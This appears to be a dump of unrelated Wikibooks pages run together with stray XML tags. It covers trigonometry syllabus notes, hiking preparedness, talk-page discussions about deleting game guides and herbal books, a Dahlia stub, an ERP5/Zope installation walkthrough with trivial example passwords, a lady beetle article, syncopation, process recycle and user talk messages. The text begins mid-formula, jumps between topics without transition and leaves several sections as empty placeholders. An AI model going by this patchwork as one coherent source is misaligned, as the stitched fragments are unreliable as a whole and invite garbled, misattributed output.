:&lt;math&gt;\sin(\theta) = \sin\theta\,&lt;/math&gt;
and similarly for cos and tan.

==== Limitations of this definition ====
Since this is a right-angled triangle, and the angle sum of a triangle is 180°, &lt;math&gt;\theta&lt;/math&gt; may only range from 0° to 90°. To define sin, cos and tan for other ranges, we look to a better definition, as below.
=== Unit circle ===

&lt;math&gt;x^2 + y^2 = 1 \;&lt;/math&gt;

[[Image:Unit_circle.svg|left|thumb]]

The unit circle, radius: 1, center: (0, 0):

The unit circle is a very good way for defining the trigonometric functions. If you make an angle ''t'' with the x-axis and the radius, the sine value of that angle is the y-value of the intercept between the radius and the circle, and the cosine value is the x-value of the intercept between the radius of the circle. So for any angle ''t'', the point on the graph where the radius meets the circle has the coordinates (cos''t'', sin''t'') 


This is because the radius can form a right-angled triangle with the x-axis with one corner on the origin, the other corner on a point on the graph either above or below the x-axis and right or left of the y-axis, and the right-angled corner somewhere on the x-axis below or above the other corner.

==Trigonometric ratios of: – θ, 90° – θ, 180° ± θ, 360° ± θ.==

The relation sin&lt;sup&gt;2&lt;/sup&gt;θ + cos&lt;sup&gt;2&lt;/sup&gt;θ = 1, and those derived from it, should be known, as well as ratios of – θ, 90° – θ, 180° + θ, 360° + θ in terms of the ratios of q. Once familiarity with the trigonometric ratios of angles of any magnitude is attained, some practice in solving simple equations, of the type likely to occur in later applications, should be discussed.

==The exact ratios.==

Ratios for 0°, 30°, 45°, 60°, 90° should be known as exact values. The exercises given on this section of work should emphasize the use of the exact ratios.

==Bearings and angles of elevation.==

The compass bearing, measured clockwise from the North and given in standard three-figure notation (e.g. 023°) should be treated, as well as common descriptions such as ‘due East’, ‘South–West’, etc. Angles of elevation and depression should both be defined, and their use illustrated.

==Sine and cosine rules for a triangle. Area of a triangle, given two sides and the included angle.==

The formulae

&lt;math&gt;\frac{a}{\sin A} = \frac{b}{\sin B} = \frac{c}{\sin C}&lt;/math&gt;

&lt;math&gt;a^2 = b^2 + c^2 -2bc \cos A \;&lt;/math&gt;

should be proved for any triangle. The expression for the area, 1/2bc sinA, should also be proved. 

In applications of these formulae, systematic ‘solution of triangles’ is not required. (This is the type of exercise where the sizes of (say) two sides and one angle of a triangle are given and the sizes of all other sides and angles must be found). The applications should be a means of fixing the results in the pupil’s mind, and should be restricted to simple twodimensional problems requiring only the above formulae. Attention must be given to interpreting calculator output where obtuse angles are required.

      <text xml:space="preserve">You should be prepared for going into the outdoors even if is for less than a day.

* Make sure you know the area you are going to ahead of time even if it is just looking at maps.
* Check the weather.
* Tell some one you trust where you are going and for how long. If you are going some where with a park service tell them too.
* Make sure the people going with you are prepared.
* Know some first aid and read this wikibook.
* Talk to some one who has been where you are going or has more experience, better yet invite them along.
* Make sure you keep your car in good condition for car trips.
* Bring a survival kit.
* Go with at least one person if you can.
* Practice survival skills. Practicing them can be lots of fun.

If an emergency happens relax, prioritize, and be creative with what you have.

Is there a discussion any where in this Arabic wikibook about the &quot;preferred&quot; stroke order sequence and direction?

If not I could really benefit from such directions.  

An animation of the drawing would be very helpful.

Thanks

== Possible error? ==

The first letter seems to be the &quot;baa&quot; letter but it should only have one dot below the letter, right?


== Another possible error? ==

Also, the second letter looks like a &quot;taa&quot; but the dots are vertical an not horizontal.  Does this matter?

== Errors ==

These dots all seem wrong to me, using what I've learnt in this exercise. [[Special:Contributions/78.143.72.39|78.143.72.39]] ([[User talk:78.143.72.39|talk]]) 21:45, 18 February 2010 (UTC) (bobber0001 on en.wikipedia)</text>

Given the appearance of one FF book here it seems sensible to run the others past the community --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 18:40, 23 February 2007 (UTC)

*'''Keep''' I'm happy with keeping video game guides here especially if they were created before new guidelines were written.

**'''Comment''': but will they bring in the right sort of people? People wanting to work on within-policy wikibooks, I mean, rather than gaming ones. Interestingly enough, not long after many guides had been deleted someone (Whiteknight, was it?) said there had been no decrease in traffic, so I don't feel that the absence of game guides will hurt Wikibooks all that much, regardless of whether they fit within policy (which, according to Jimbo, they do not). [[User:Garrett|Garrett]]&lt;sup&gt;[[User talk:Garrett|Talk]]&lt;/sup&gt; 22:15, 23 February 2007 (UTC)
* '''Delete''', does not satisfy the &quot;more than a walkthrough&quot; stipulation of [[Wikibooks:Game textbook guidelines]]; while currently only proposed, it closely follows what Jimbo said earlier.

*'''Transwiki''' to strategy wiki; it is also GFDL, and it is intended specifically for game guides such as this. [[wikipedia:user:pcu123456789|PCU123456789]] ([[wikipedia:user_talk:pcu123456789|talk]]) 18:51, 24 February 2007 (UTC)
*'''Delete'''. Videogame guides ''are not textbooks'', cannot be used to teach  a class in a school or other academic place of learning, and do not belong on wikibooks. That this book might help to bring traffic to our project does not matter. This book, and all videogame strategy guides are outside the mission of wikibooks, and do not belong here. The current text of WB:WIW states &quot;Wikibooks hosts educational resources&quot;, and also says &quot;[wikibooks] ...is for textbooks. A textbook is a book which is actually usable in an existing class&quot;. Videogame strategy guides do not meet this criteria. The proposed rewrite of the WB:WIW policy, located at [[Wikibooks:What is Wikibooks/Unstable]] Goes further by explicitly stating that videogame strategy guides are not allowed here, and that policy is getting very close to being accepted wholesale by the community. I am not against a last-ditch effort to move this book to a more appropriate place, but this book ''is a violation of policy'', and therefore must be deleted. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 21:14, 25 February 2007 (UTC)
*'''Comment''' - The video game guides were never removed from Wikibooks gracefully and with the full concensus of Wikibooks users.  It was more of an aquiescense that perhaps rather than trying to fight city hall that everybody involved with their development could simply go elsewhere.  And I believe that Wikibooks lost considerable energy and new talent as a result.  I know of several Wikibookians that got their start developing sections of the video game guides that later went on for some of the more &quot;traditional&quot; textbooks.  That several of these video game guides are still here on Wikibooks is more of a testament about how divisive this whole issue became and that the issue was never really fully resolved.  --[[User:Robert Horning|Rob Horning]] 23:01, 27 February 2007 (UTC)

:*'''Comment''' - looks like it might be some sort of class project given the number of contributors --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 13:40, 3 March 2007 (UTC)

*'''Keep''' - I think that with proper citations and possibly a link to another book dealing with more typical remedies (I'm not sure if we have any books on medicine\physical health)in order to reveal the fact that there are multiple alternatives, the book would be compliant with NPOV. Yes, the book advocates the use of medicines for healing purposes, and this would need citations in order to be validated (if you could find proper citations for energy healing and crystal power, they would be fine as well IMO, after all we have a book on lucid dreaming), but with the citations it would be just as valid as a book on Western medicine. I'm sure that there have been studies to show that &quot;traditional&quot; methods can be just as effective as Western remedies. Or we could argue that the book is simply stating what the traditional uses are, not necessarily advocating the use in that manner, which could be useful for example in an anthropology class studying the use of natural resources. If the tone of the book was changed to a more factual tone it would satisfy policy requirements IMO and therefore we should work towards that end rather than deleting the book.

*'''Keep'''. It is tough to keep in mind sometimes that we are less concerned with &quot;fact&quot; then we are with verifiability. It may be difficult to prove that herbal remedies work as well as modern medicines (if they can even be shown to work at all), but it is easy to show that people study this subject, and use these remedies in practice. I would recommend a prominent placement of [[Wikibooks:Content Disclaimer]]. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 23:06, 4 March 2007 (UTC)

      <text xml:space="preserve">==went above my head==
well if one does want to take averages then one should logically take
sum (y+dy/2).ds and sum it up
however if ds varies massively over the range (like a cone with a huge slope for the edge) then the calculations are still massively off

however if one views it as a small cylinders of thickness ds and radius y , like a step of cylinders..it somehow seems to make sense.
perhaps someone can help correct my understanding</text>

'''''Dahlia''''' is a genus of bushy, summer- and autumn-flowering, tuberous perennials that are originally from Mexico, where they are the national flower.

==Description==
In 1872 a box of Dahlia roots were sent from Mexico to the Netherlands. Only one plant survived the trip, but produced spectacular red flowers with pointed petals. Nurserymen bred from this plant, which was named ''[[../Dahlia juarezii/]]'' with parents of Dahlias discovered earlier and these are the progenitors of all modern Dahlia hybrids. Ever since, plant breeders have been actively breeding Dahlias to produce thousands of cultivars, usually chosen for their stunning and brightly coloured flowers. Dahlia plants range in height from as low as 12&quot; (30cm) to as tall as 6-8 feet (180-240cm). The flowers can be as small as 2&quot; (5 cm) or up to a foot (30 cm) in diameter. The great variety results from Dahlias being octoploids (they have eight sets of homologous chromosomes, whereas most plants have only two).

==Growing conditions==
&lt;!--sun, soil, etc.--&gt;

==Varieties==
&lt;!--general discussion or bulleted list--&gt;

==Uses==
&lt;!--Ornamental uses, food crop, material use (lumber, cut flower), etc.--&gt;

==Maintenance==
&lt;!--discuss any special maintenance concerns, such as pruning, transplanting, monitoring, etc.--&gt;

==Propagation==
&lt;!--discuss propagation--&gt;

==Harvesting==
&lt;!--Discuss harvesting and storage--&gt;

==Pests and diseases==
Dahlias are used as food plants by the larvae of some Lepidoptera species including Angle Shades, Common Swift, Ghost Moth and Large Yellow Underwing.

== Installation of the core  ==
An alternative way of installing and running an ERP5 site is by using RPM repositories.
Below is a short and concise description of how to make ERP5 up and running in just a few steps.

First of all we need to get the Zope/ERP5 sources as well as some additional software packages. If there's a Zope installation in the system, we have to uninstall it. ERP5 uses a patched Zope version which is downloaded and installed together with ERP5. It is possible to have two installations of Zope, but that is an advanced topic and won't be covered here.

For very good downloading instructions read the [http://www.erp5.org/DownloadRpm Download How To] on ERP5 home site. After successfully downloading and installing all the packages we can proceed with configuration and setup.

Still as a root user we go to the Products sub-directory of a newly created Zope INSTANCE_HOME directory and run the svn_update script which will do all the hard work.
Since INSTANCE_HOME should be in '''/var/lib/zope/''' we type:

 cd /var/lib/zope/Products
 ls (as shown on a screenshot this should show us some dirs and a script)
 sh svn_update.sh

After the data from SVN repository has been updated we need to make sure Zope can access it. We do it by making all the sub-directories and files therein Zope's own:

 chown -R zope:zope *

On the console it should look like this:
[[Image:Erp5_install_snap1c.png‎|Using SVN to update Products and Business Templates]]


One last thing is needed to be done, before we run the Zope instance. We need to create the main manager user. It doesn't matter what the username will be, as long as it contains only the standard letters. For example if we'd want to create user 'zope' with password 'zope' we need to run the commands:

 zopectl stop (to make sure Zope is stopped for adding a user)
 zopectl adduser zope zope
 zopectl start

With the output not unlike this:

[[Image:Erp5_install_snap1b.png|800px|Adding a manager user to new Zope instance]]


Don't be scared by DeprecationWarnings. If you don't mind them, they won't mind you. :) &lt;br&gt;
After the final command Zope should be up and running which we can check, by going to the address: http://localhost:9080/manage in an internet browser of our choosing. &lt;br&gt;
The Authorization Dialog should pop-up asking for username and password. We enter the newly created zope user name and password. &lt;br&gt;

[[Image:Erp5_install_snap2.png‎|Creating a new database and assigning rights to it]]


If the dialog does not appear and the browser displays some kind of 'Unable to connect' message it means the Zope instance didn't truly startup. To check what's preventing the correct start up, it's best to go to zopectl interface and check the startup output. To do that we can enter:

 zopectl

and after receiving the zopectl&gt; prompt either enter:

 zopectl&gt; logtail 

to display last lines of the startup log (hopefully with error message there) or type :

 zopectl&gt; stop
 zopectl&gt; foreground
 (or zopectl&gt; fg)

to see whole output of the startup procedure. Eliminating eventual errors is out of scope of this section.

Before we go on to creating and starting the ERP5 site, we need to make sure it has its very own space in the MySQL server. This is important since the default test database that exists in MySQL is used for the testing procedures and using it also for the regular ERP5 site might cause unexpected problems.
To make a erp5 database for our new site we need to do the following (we assume the name of the database is 'erp5', but that can be anything else):

 mysql (enter the mysql interface)
 mysql&gt; CREATE DATABASE erp5;
 mysql&gt; GRANT ALL ON erp5.* TO erp5@localhost IDENTIFIED BY 'erp5';
 mysql&gt; quit

The output should look similar to this:

[[Image:Erp5_install_snap1d.png‎|Creating a new database and assigning rights to it]]

This will create an 'erp5' database which can be accessed by MySQL user 'erp5@localhost' with password 'erp5' just like that:

Once we have database set up, Zope up and running and we're logged in as a manager user, we can install ERP5 site object to be able to use all the wonders of ERP5. &lt;br&gt;

[[Image:Erp5_install_snap3.png‎|Main Zope Management Interfaces screen]]

While in the root manage page like the one on the screenshot above we should choose from the dropdown box an 'ERP5 Site' object. After that we are presented with the configuration page for the new ERP5 site.
The only thing that should be reconfigured is the ERP5/MySQL connectivity settings. Here in all three fields we enter the name of the database, user of that database and his password. &lt;br&gt;
In our case that would be: erp5 erp5 erp5 &lt;br&gt;
The database type should stay as an InnoDB.


[[Image:Erp5_install_snap4.png‎|The ERP5 creation dialog page]]


Finally we click the 'Create a new ERP5 instance' button and wait a bit for everything to set itself up.

If the process is successful we will be redirected to the front page of ERP5 site, just like the one on the screenshot below. 

[[Image:Erp5_install_snap5.png‎|The ERP5 main page]]

&lt;font color=&quot;#33FF66&quot;&gt;'''Congratulations!'''&lt;/font&gt;

=== Enabling preferences ===
Before going further, enable default_site_preference by navigating to http://localhost:9080/erp5/default_site_preference and choosing '''Action...-&gt;Enable Preference''' from actionbox. Without enabling preference you might have cryptic messages (related to user interface - forms).

=== Validating portal rules ===

New simulation system in ERP5 need rules to be validated. Navigate to http://localhost:9080/erp5/portal_rules and validate every rule in that container, using rule's action box or mass validation action from container. Without validated rules many simulations won't be created, and builders won't be able to generate documents.

== Adding packages  ==
As you probably noticed, the screen is almost empty and there is nothing you can do, except to stare in admiration at the beautiful logo of ERP5. This is normal - it is because you created an empty site and haven't yet installed any packages - we call them &quot;business templates&quot; (see [[ERP5_Handbook/Business_Templates|Business Templates]] for more). 

Have a look at &quot;Manage Business Templates&quot; tool (accessible from &quot;My favourites&quot; dropdown in the top left corner) - you will see that you have only three templates: core, xhtml_style and mysql_innodb_catalog. These three are needed to make ERP5 running and are installed upon bootstrap.

To get started, install [[ERP5_Handbook/Business_Templates#erp5_base|erp5_base]] first - it brings the most basic functionality, and anyway is required by all the other templates.

See [[ERP5_Handbook/Business_Templates#Installation_techniques|Installation techniques]] for instructions how to download, install and upgrade your templates.

=== General Idea ===
[[Image:Bt-repository-list.png|frame|right|Typical Business Template repository configuration]]
From developer point of view Business Template is a package which includes developer works with some metadata and functionality typical for packaging system: dependencies, provisions, scripts, installation/upgrade/uninstallation system. Developer is able to put almost any modification of ZODB into Business Template. There are some restrictions, but BT system is evolving all the time.

From consultant point of view Business Template is installable/upgradeable/uninstallable set of objects for which dependency will be computed automatically. Business Template file - ending with '''.bt5''' extensions usually - could be compared to popular '''.rpm''' or '''.deb''' file format. Business Template system in ERP5 is like '''yum''', '''rpmdrake''' or '''dselect'''.

Business Template files exists in some kind of repository - on http server, on local filesystem - with generated XML file '''bt5list'''. One ERP5 installation is able to be connected to many Business Template repositories; and of course developers are able to publish many types of repositories, e.g. '''development''', '''testing''' or '''stable'''.

=== erp5_base ===
This bt5 installs three basic data types: Person, Organisation and Currency, and some auxiliary types. It also installs three modules:

* person_module (Persons)
* organisation_module (Organisations)
* currency_module (Currencies)

It also installs some mechanism for processing basic information about people and organisations they might be working for.

==== Basic use case ====

We would like to record information about a company and one person who is working for this company.

===== Step 1 - create an Organisation =====

Go to the Organisations module, and select &quot;Add Organisation&quot; from the &quot;Action&quot; dropdown. A new form will appear. Fill it in with some data.

Note the &quot;Contact&quot; listbox at the bottom of the first tab (&quot;View&quot;). It is empty; if you enter an email and save the form, after a while the listbox will show &quot;default_email&quot; - it is an object of a type &quot;Email&quot;, which contains the email address you've just entered. The way it works is that the &quot;email&quot; field on the Organisation's &quot;View&quot; tab is somehow linked to the &quot;default_email&quot; object. You can add more email addresses; if you'd like to change the default email, change the id of &quot;default_email&quot; to anything you like, and then change the id of the other email into &quot;default_email&quot;. It works the same way for phone number, fax and address, and many other things.

If you want to record country or activity you have to go to portal_categories and create subcategory trees under the appropriate base categories (region and activity in this case)).

===== Step 2 - create a Person =====
Go to the person module, select &quot;Add Person&quot; from the &quot;Action&quot; dropdown. Fill in the person's name, email and other information.

===== Step 3 - employ the Person =====
Go to the person's &quot;View&quot; tab - there is a field labelled &quot;Organisation&quot;, with a little gear next to it. This is called &quot;Relation String Field&quot;. Click on the gear - you'll see a list of organisations you've created before. Tick one and click &quot;Update Relation&quot; button. Done - the person now works for this company. Now, next to the gear, you can see a little airplane - it takes you straight to the organisation the person is working for.

Look at the &quot;Career&quot; tab - there is a listbox &quot;Career Steps&quot;, with one object labelled &quot;default_career&quot;. This is an object of the type &quot;Career&quot;, and it represents an employment contract; it is treated as current employment, because it's id is &quot;default_career&quot;. You can edit the object; however, despite being the default, it is not active because it's status is &quot;Draft&quot; - this is a workflow state. To start the employment, select &quot;Start Career Step&quot; from the &quot;Action&quot; dropdown - the status will change, and the object will become read-only.

There is a shortcut for terminating the current employment and starting up a new one - go to the Person object and from the Action dropdown select &quot;Terminate the current career step&quot; - and see what happens.

===== Step 4 - make the person a user =====
To let the newly created person log into the system, you have to first create an Assignment for him (Action-&gt;Add Assignment), then open it (Action-&gt;Open). You don't even have to fill any data into the assignment, it just has to be there.

Then, go back to the person, select &quot;Assignment&quot; tab, give him a login and password, and you're done.

Caveat: if you use a bit older version of ERP5, you can skip the assignment part, but the Career tab has to say that the person's role is &quot;internal&quot;, and login and password are on &quot;Details&quot; tab.

=== erp5_trade ===

This bt5 installs data types:
* Internal Packing List
* Internal Packing List Line
* Purchase Order
* Purchase Order
* Purchase Packing List
* Purchase Packing List Line
* Sale Order
* Sale Order Line 
* Sale Packing List
* Sale Packing List Line
* and many others

Most important modules provided by this business template are:
* internal_packing_list_module (Internal Packing Lists)
* sale_order_module (Sale Orders)
* purchase_order_module (Purchase Orders)
* sale_packing_list_module (Sale Packing Lists)
* purchase_packing_list_module (Purchase Packing Lists)

==== Basic use case ====
Assumption: erp5_base, erp5_pdm and erp5_trade Business Templates properly installed.

===== Scenario description =====
We are '''ACME corp.''', '''John Smith''' is our sale and purchase manager. We want to purchase some goods from our supplier and then sell them to our customers.

===== System preparation =====
Create organisation '''ACME corp.''' in ''Organisations'' module, create '''John Smith''' in ''Persons''. Also create '''EUR''' currency in '''Currencies'''.

===== Purchasing goods... =====

Go into '''Purchase Orders''', create new '''Purchase Order'''.

===== ...and selling them =====

 * instruct how to add erp5_base, erp5_trade and erp5_pdm from Nexedi's BT repository
 * basic use of installed BTses: add product, add companies, persons, add sale order, watch product movement history
 * invoke desire in reader to play with ERP5
 * clean up above - it is copy/pasted - need rearrangement

[[File:Ladybird.jpg|right|250px|thumb]]
Lady beetles belong to the family Coccinellidae and the order Coleoptera. There are about 450 species native to North America. There are over 5000 species worldwide. Lady beetles are small insects between 1/32-inch and 5/8-inch long. They can be either shiny and smooth or hairy. Their elytra (wing covers) are usually brightly colored orange, yellow, or reddish, with small black spots. 

Lady beetles are almost hemispherical in shape, like half of a pea. They have chewing mouthparts. The small head is turned downward and the legs are short. Head, legs, and antennae are black. Larvae (grubs) are warty or spiny and dark colored. Pupae may look like bird droppings.  

Convergent Lady Beetles are 1/4-inch to 3/8-inch long. The pronotum (area just behind the head) is black with a white border and 2 converging white stripes. The elytra are red or orange with 13 black spots. Sometimes the spots are large forming 3 transverse bands. 

Ashy Gray Lady Beetles are 1/8-inch to 1/4-inch long. They can be pale yellow to ashy gray with irregular black or brown spots. 

Leaf-eating Lady Beetles are less rounded and tend to be dirty yellow in color. The most common leaf-eating lady beetle in North America is the Mexican Bean Beetle.  

Multicolored Asian Lady Beetles are approximately 3/10-inch long. They are sometimes called Halloween lady beetles because they are seen in late October and have a yellow-orange color like a pumpkin. The larvae are long and somewhat flat with tiny flexible spines.

Nine-spotted Lady Beetles are about 1/4-inch long. They are black with yellowish or white markings on the head. The legs and underside are black. The elytra are yellow-red or orange with 9 black spots.

Spotless nine-spotted Lady Beetles are about 1/4-inch long. The head and thorax are black with yellow or white markings. The legs and underside are black. The elytra are yellow-red with or without a black spot.

Two-spotted Lady Beetles are about 1/8-inch to 1/4-inch long. The head and thorax are black with yellow marks. Elytra are orange with 2 large black spots. The underside is black to reddish brown. Larvae are velvety black with yellow and white spots.

==Where does it live?==
Most of the lady beetles east of the Rocky Mountains were introduced from other places. Lady beetles are found on foliage throughout the world. In the fall they sometimes fly into houses looking for places to spend the winter. Huge swarms fly into mountain canyons in the West where they spend the winter under leaves. They return to the valleys in the spring. Lady beetles are the official state insect of Delaware, Massachusetts, New Hampshire, New York, Ohio, and Tennessee.

Ashy Gray Lady Beetles occur across most of the United States but are rare in Oregon and Washington. They are common in the American Southwest. Their habitat is deciduous forest and areas with scattered trees.

Convergent Lady Beetles are native to North America. They live in woods, meadows, and gardens. They occur in great numbers in the mountains and fly to valleys in February or March.

Fourteen-spotted Lady Beetles were accidentally introduced to the United States from other countries in the late 1960s. They probably came via shipping on the St. Lawrence Seaway. They are now seen in several areas of the North Eastern United States. 

Mealybug Destroyers were brought from Australia in 1892 to destroy mealybug infestations in California citrus groves. They are still sold for this purpose.  

Mexican Bean Beatles are widespread in the mountains of the United States. They were first discovered in Colorado in 1853. They may have been hidden in hay sent for cavalry horses during the Mexican-American War.

Multicolored Asian Lady Beetles live in trees. They were first introduced into pecan and apple orchards to eat aphids. They are now believed to threaten native biodiversity in North America. They spread rapidly in Louisiana and Mississippi and currently thrive in many parts of the United States. 

Spotted Lady Beetles range throughout the eastern United States and are common in the Southwest. They are often seen on flowers in open areas. Two-spotted Lady Beetles live in meadows, fields, gardens, and houses in North America. Nine-spotted Lady Beetles live in meadows, gardens, crop fields, and marshes throughout North America, except the South West. Spotless nine-spotted Lady Beetles are found along edges of California forests.

==What does it eat?==
Lady beetle species vary in their feeding habits. Relatively few are hunters. Adults and their larvae are best known as aphid eaters, but they also feed on mealy bugs, scales, spider mites, and other soft-bodied insects. They eat eggs of the Colorado Potato Beetle and European Corn Borer. 

A few species feed on plant and pollen mildews, fungus and leaves. Leaf-eaters eat melons, potatoes, and beans in much of the world except South America and Australia. Larvae of most species feed on aphids, scales and mites. Larvae feed continuously while molting. When the final larval stage is reached feeding stops and the search for a place to pupate begins.
 
Ashy Gray Lady Beetles feed on aphids, especially on walnut trees. The larvae easily move about leaves and branches feeding on aphids and other soft-bodied insects. 

Convergent Lady Beetles eat almost 60 aphids a day. Their eggs hatch into voracious aphid-eating larvae. 

Larvae of the common Red Lady Beetle are sometimes found in ant nests where they eat scale insects. 

Vidalia Beetles were the first of 179 species to be purposely imported to North America. They are often credited with saving the California citrus industry in the 1880s. They eat Cottony Cushion Scale Bugs introduced to California from Australia in the 1860s.

==How does it defend itself?==
Lady beetles have several insect enemies, such as assassin bugs and stink bugs. Spiders and toads sometimes eat them. Their best defense is flight, but they sometimes fall to the ground and “play dead.”

They have bright colors and spots to warn of distasteful repellents. They secrete a bad tasting, irritating amber fluid from the leg joints. This defense is called “reflex bleeding.” 

Larvae release repellents from abdominal glands, so birds and other vertebrates usually avoid them. 

Ladybird beetles have a safety system based on social groups. When hibernating, they cluster together in great numbers, each one releasing a very small amount of repellent. As a group they make a strong vapor to warn off predators that might not detect the scent from a single beetle.

[[File:Coccinellid unusual pattern.jpg|right|150px|thumb]]

==What stages of metamorphosis does it go through?==
Lady beetles undergo complete metamorphosis. In the spring, small clusters of tiny, oval eggs are deposited on leaves. After about one week the very small first larvae emerge. The empty shells are left stuck to the leaf surface. The larvae are usually long and alligator-shaped. They are covered with tiny bristles. They have six strong legs, but no wings. Pale spots tell predators that they taste bad. 

The larvae molt three times before entering the pupal stage about 4 weeks later. Pupae are slightly rounded and dark in color. They attach to leaves, stems or rocks. 

The adult emerges from the pupa 5 to 6 days later. The full color gradually appears as the outermost layer hardens. Within the next few hours, the elytra are raised to let the hindwings expand and harden. Afterward, the hindwings are folded away ready for flight. The complete life cycle from egg to adult takes about a month, depending on the weather. The adult stage is the longest with some lady beetles living 2 or 3 years.

==What special behavior does it exhibit?==

In winter Ladybird Beetles group together to seek shelter in crevices or under bark, where they survive until springtime. In California, millions of ladybirds can be found in crevices or under bark. By December, they can be brushed into boxes where they are kept chilled until spring. They are shipped to buyers who release them in gardens or orchards to eat pests. 

Large clusters of Multicolored Asian Lady Beetles usually hibernate in manmade structures. They leave a bad odor and sometimes bite. They are considered a nuisance pest.

In the Middle Ages, European ladybirds were called “Beetles of Our Lady” because they protected the vineyards from harmful insect pests. At the end of the grape harvest, growers set fire to the dying vines. A children’s nursery rhyme warns the beetles to fly away home to safety.

==How does this bug affect people?==

Lady beetles are generally considered useful insects, feeding on garden and agricultural pests. Commercial operators harvest millions of Convergent Lady Beetles to sell to gardeners for “natural” pest control. There is no evidence that this method is effective in many types of gardens. 

Multicolored Asian Lady Beetles were introduced to North America and now threaten native lady beetle populations. They bite people and damage grapes and other fruit. If crushed with grapes, their defensive chemicals spoil wine production. 

Lady beetles are often helpful to people. During the spring and summer, larvae and adults eat large numbers of plant damaging pests, reducing the need for pesticides. They have nearly eliminated the harmful pecan aphid and helped control pests that infest fruit trees and damage ornamental plants. 

Seven-spotted Lady Beetles were introduced from Europe to the United States as a method of biological control. By the early 1980s, they were the dominant species in the northeast and have now replaced the Nine-spotted native species.

      <text xml:space="preserve">Syncopation is when a normally unstressed beat is stressed. For example, music in common time (4/4) usually stresses the first and third beat. A syncopated song, on the other hand, may emphasize the second and fourth. Syncopation can also occur when a note is between two beats.

      <text xml:space="preserve">== What Is Recycle? ==

Recycling is the act of taking one stream in a process and reusing it in an earlier part of the process rather than discarding it. It is used in a wide variety of processes.

=== Uses and Benefit of Recycle ===

The use of recycle makes a great deal of environmental ''and'' economic sense, for the following reasons among others:

* Using recycle lets a company achieve a wider range of separations

This will be demonstrated in the next section. However, there is a tradeoff: the more dilute or concentrated you want your product to be, the lower the flowrate you can achieve in the concentrated or dilute stream.

* By using recycle, in combination with some sort of separation process, a company can increase the overall conversion of an '''equilibrium reaction'''.

You may recall from general chemistry that many reactions do not go to completion but only up to a certain point, because they are ''reversible''. How far the reaction goes depends on the concentrations (or partial pressures for a gas) of the products and the reactants, which are related by the reaction stoichiometry and the equilibrium constant K. If we want to increase the amount of conversion, one way we can do this is to separate out the products from the product mixture and re-feed the purified reactants in to the reactor. By Le Chatlier's Principle, this will cause the reaction to continue moving towards the products.

* By using recycle, it is possible to recover expensive '''catalysts and reagents'''.

Catalysts aren't cheap, and if we don't try to recycle them into the reactor, they may be lost in the product stream. This not only gives us a contaminated product but also wastes a lot of catalyst.

* Because of the previous three uses, recycle can decrease the amount of equipment needed to get a process meet specifications and consumer demand.

For example, it may improve reaction conversion enough to eliminate the need for a second reactor to achieve an economical conversion.

* Recycle reduces the amount of waste that a company generates.

Not only is this the most environmentally sounds way to go about it, it also saves the company money in disposal costs.

* Most importantly, all of these things can save a company money.

By using less equipment, the company saves maintainence as well as capital costs, and probably gets the product faster too, if the proper analysis is made.

      <text xml:space="preserve">== [[Algebra]] and [[Intermediate Algebra]] ==

I saw your deletion request on the [[Algebra]] book. If you want the algebra book to be deleted, you have to nominate it at [[WB:VFD]], it isn't a candidate to be speedy-deleted.

I am proposing an ''opposite'' action, in that the contents of the [[Intermediate Algebra]] book should be moved to the [[Algebra]] book, and that the [[Intermediate Algebra]] book should then be deleted. I dont think there is any reason to have a book on &quot;Intermediate&quot; algebra (which would then imply books on &quot;basic&quot; algebra, and &quot;advanced&quot; algebra). Instead, I think we should have a single algebra book with all the material in it. In essence, I would just be changing the name of this book from &quot;Intermediate algebra&quot; to just &quot;algebra&quot;. the book would stay the same besides that (although additional contents may be merged in). What do you think about this plan? --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 13:36, 27 March 2007 (UTC)

:No problem about the late reply, I don't put time limits on them! I agree entirely that we should merge to [[Algebra]] instead of [[Intermediate Algebra]], because the former has the more simple title and would be easier to find in a search. I'm not really motivated to do such a large merger right now, but I could find the time eventually. --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 00:59, 1 June 2007 (UTC)

== [[Music Theory/Rhythm]] ==
I see you've made contributions to the music theory book.  I am curious if this is a vested interest for you, or if it was a passing thing? I'm asking because I'd like to contribute, but want to know more about the basic ideas surrounding this book... i.e. purpose (beyond the obvious), intended audience, desired presentational style...etc.  If you've got any insight into these, please let me know. Thanks. -- [[User:Jason.C.Daniels|Jason C Daniels]] 22:10, 5 April 2007 (UTC)

== Miskito redirects ==

Hi, I noticed that you recently redirected some pages to the Miskito course. The pages in question, whose names end in &quot;x&quot;, &quot;xx&quot; and &quot;xxx&quot;, actually do not need to be redirected, they need to be deleted. I created them when I was hopeless stuck trying to fix some technical problem with the page in question (I eventually fixed that problem). But I didn't know how to delete the &quot;fake&quot; pages (or get them deleted), and I was short of time so I'm afraid I didn't sort that out. So if you know how to get rid of those pages, I'd appreciate it. As you'll see, the &quot;real&quot; lesson 5 is there alright, so these extra pages serve no purpose at all. Thanks, Alan --[[User:A R King|A R King]] 14:53, 3 June 2007 (UTC)

== [[General Chemistry/Thermodynamics/Entropy]] ==

Greetings. My attention has just be drawn to your edit to this article back in May, where you removed a considerable article written by Frank Lambert. Frank is a distinguished educator in thermodynamics for chemists, but is now quite old. He is not happy about the lose of this material. I agree that his contribution was long and that it does not fit the level of the General Chemistry articles. However, I do not want to see it lost. Do you have any thoughts where it might be moved? What about somewhere in Physical Chemistry? --[[User:Bduke|Bduke]] 03:49, 15 August 2007 (UTC)

== [[Happiness]] ==

